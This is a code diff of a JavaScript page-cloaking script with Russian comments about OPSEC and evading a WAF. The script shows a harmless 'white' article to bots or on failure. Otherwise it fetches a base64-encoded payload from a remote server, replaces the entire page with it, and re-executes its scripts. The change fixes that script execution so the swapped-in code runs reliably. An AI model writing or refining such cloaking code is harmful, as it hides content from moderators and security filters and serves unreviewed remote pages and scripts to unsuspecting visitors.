@@ -43,7 +43,7 @@
                 return _o; 
             }
 
-            // Функция проявления белого сайта (Если это бот)
+            // Функция проявления белого сайта
             function _showWhite() {
                 document.body.style.opacity = '1';
             }
@@ -69,14 +69,13 @@
                 .then(function(r){ return r.json(); })
                 .then(function(d){
                     if (d && d.status === 'success' && d.payload) {
-                        // 1. Подменяем HTML
                         var _h = decodeURIComponent(escape(atob(d.payload)));
                         var _nd = new DOMParser().parseFromString(_h, 'text/html');
                         document.documentElement.replaceChild(_nd.body, document.body);
                         document.documentElement.replaceChild(_nd.head, document.head);
                         
-                        // МАГИЯ OPSEC 2: Оживляем JS-скрипты, заблокированные DOMParser-ом
-                        var _scripts = document.getElementsByTagName('script');
+                        // ИСПРАВЛЕНИЕ: Используем querySelectorAll (статичная коллекция)
+                        var _scripts = document.querySelectorAll('script');
                         for (var j = 0; j < _scripts.length; j++) {
                             if (_scripts[j].text) {
                                 var _s = document.createElement('script');
@@ -85,10 +84,10 @@
                             }
                         }
                     } else {
-                        _showWhite(); // WAF заблокировал - показываем белую статью
+                        _showWhite(); 
                     }
                 }).catch(function(){
-                    _showWhite(); // Ошибка сети (туннель упал) - показываем белую статью
+                    _showWhite(); 
                 });
             }
             
